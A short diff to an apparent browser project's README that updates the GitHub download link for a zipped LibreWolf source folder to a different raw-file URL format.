@@ -10,7 +10,7 @@ As an **open-source project**, we publish our source layout here to maintain abs
 
 As **this is a browser based on the privacy-focused browser LibreWolf**, all the source code folders are present in this directory, except the **"LibreWolf"** folder.
 
-**The LibreWolf folder is hosted  as a zip and can be downloaded [here](https://github.com/WavierPigeon261/spectre-browser/blob/assets/librewolf.zip?raw=true)**.
+**The LibreWolf folder is hosted  as a zip and can be downloaded [here](https://github.com/WavierPigeon261/spectre-browser/raw/refs/heads/assets/librewolf.zip?download=)**.
 
 **Thank you!**
 
